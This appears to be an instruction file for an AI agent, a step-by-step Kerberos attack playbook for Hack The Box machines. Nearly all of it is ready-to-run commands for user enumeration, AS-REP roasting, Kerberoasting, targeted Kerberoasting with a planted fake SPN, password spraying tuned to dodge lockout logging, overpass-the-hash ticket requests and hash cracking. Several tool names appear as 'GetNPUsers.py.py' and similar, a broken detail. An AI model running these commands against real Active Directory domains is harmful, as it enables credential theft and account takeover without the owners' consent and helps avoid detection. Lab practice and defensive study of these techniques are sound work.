---
name: kerberos
description: Kerberos attacks (port 88). Use when port 88 is open. Covers user enumeration with kerbrute, AS-REP roasting, Kerberoasting, password spraying, clock skew fix, Pre-Win2000 Kerberos auth, targeted kerberoast.
user-invocable: false
allowed-tools: Read
---

# Kerberos — Port 88

## Step 1 — clock skew (fix first if Kerberos fails)
Kerberos requires time sync within 5 minutes. Always fix before any Kerberos attack.
```bash
sudo ntpdate {IP}
sudo rdate -n {IP}
faketime "$(rdate -n {IP} 2>&1 | awk '{print $NF}')" bash     # without root
timedatectl set-ntp false && sudo ntpdate {IP}                 # disable NTP then sync
```

## Step 2 — user enumeration (no creds needed)
```bash
kerbrute userenum --dc {IP} -d {DOMAIN} \
  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
kerbrute userenum --dc {IP} -d {DOMAIN} users.txt             # from RID brute or OSINT
```
Valid usernames from kerbrute → use for AS-REP roast immediately.

## Step 3 — AS-REP roasting (no creds needed)
Targets accounts with "Do not require Kerberos preauthentication" set.
```bash
# No creds — needs valid username list
GetNPUsers.py.py {DOMAIN}/ -dc-ip {IP} -no-pass -usersfile users.txt
GetNPUsers.py.py {DOMAIN}/ -dc-ip {IP} -no-pass -usersfile users.txt -format hashcat

# With creds — finds all AS-REP roastable accounts automatically
nxc ldap {IP} -u '{USER}' -p '{PASS}' --asreproast asrep.txt
GetNPUsers.py.py {DOMAIN}/{USER}:'{PASS}' -dc-ip {IP} -request

# Crack
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
john --wordlist=/usr/share/wordlists/rockyou.txt asrep.txt
```

## Step 4 — Kerberoasting (needs any valid creds)
Targets service accounts with SPNs set.
```bash
# With password
nxc ldap {IP} -u '{USER}' -p '{PASS}' --kerberoasting kerb.txt
GetUserSPNs.py.py {DOMAIN}/{USER}:'{PASS}' -dc-ip {IP} -request
GetUserSPNs.py.py {DOMAIN}/{USER}:'{PASS}' -dc-ip {IP} -request -outputfile kerb.txt

# With hash (Overpass-the-Hash)
GetUserSPNs.py.py {DOMAIN}/{USER} -hashes :{NT_HASH} -dc-ip {IP} -request

# Kerberos-only environment (no NTLM)
GetUserSPNs.py.py {DOMAIN}/{USER}:'{PASS}' -dc-ip {IP} -request -k -no-pass

# Crack
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
**rockyou fails → not the intended path. Pivot immediately. Don't waste time on custom wordlists.**

## Step 5 — targeted kerberoast (needs GenericWrite/GenericAll on user — see ACL abuse)
```bash
# Add fake SPN to target account
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} \
  set object {TARGET} servicePrincipalName -v 'fake/spn'

# Kerberoast the target
GetUserSPNs.py.py {DOMAIN}/{USER}:'{PASS}' -dc-ip {IP} -request

# Remove SPN after cracking (cleanup)
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} \
  remove object {TARGET} servicePrincipalName -v 'fake/spn'
```

## Step 6 — password spraying
```bash
# Check lockout policy FIRST
nxc ldap {IP} -u '{USER}' -p '{PASS}' --pass-pol

# Spray via Kerberos (avoids LDAP/SMB lockout logging)
kerbrute passwordspray --dc {IP} -d {DOMAIN} users.txt '{PASSWORD}'

# Spray via SMB
nxc smb {IP} -u users.txt -p '{PASS}' --continue-on-success
nxc smb {IP} -u users.txt -p passwords.txt --no-bruteforce --continue-on-success

# Spray via LDAP
nxc ldap {IP} -u users.txt -p '{PASS}' --continue-on-success

# Common spray passwords for HTB
# Password1, Password123, Welcome1, Welcome123, {Company}1, {Season}{Year}
# {DOMAIN}1, {DOMAIN}123, {Username}{Year}
```

## Step 7 — Pre-Windows 2000 accounts via Kerberos
```bash
# Computer accounts created with Pre-Win2000 compatibility have password = lowercase hostname (no $)
nxc ldap {IP} -u 'LEGACYPC$' -p 'legacypc' -k             # Kerberos auth
getTGT.py.py {DOMAIN}/'LEGACYPC$':'legacypc' -dc-ip {IP}
```

## Step 8 — TGT / ticket operations
```bash
# Request TGT with password
getTGT.py.py {DOMAIN}/{USER}:'{PASS}' -dc-ip {IP}

# Request TGT with hash (Overpass-the-Hash)
getTGT.py.py {DOMAIN}/{USER} -hashes :{NT_HASH} -dc-ip {IP}

# Request TGT with certificate
getTGT.py.py {DOMAIN}/{USER} -cert-pfx {USER}.pfx -dc-ip {IP}

# Use ticket
export KRB5CCNAME={USER}.ccache
klist                                                          # verify ticket
```

## Gotchas
- **KRB_AP_ERR_SKEW** → clock out of sync; fix with ntpdate before retrying
- **KDC_ERR_PREAUTH_REQUIRED** → account DOES require preauth; remove from AS-REP list
- **KDC_ERR_C_PRINCIPAL_UNKNOWN** → username invalid; check spelling, case
- **gMSA accounts** → Kerberoasting always fails; skip them
- **Protected Users group** → no RC4, Kerberoasting returns AES hash (hashcat -m 19700/19600); much harder to crack
- **rockyou fails** → not the intended path; pivot immediately
- **Spray carefully** → default lockout is 5 attempts; spray 1 password per user per wave, wait 30 min between waves
- **Kerberos-only env** → add `-k -no-pass` and set up `/etc/krb5.conf` with realm and DC
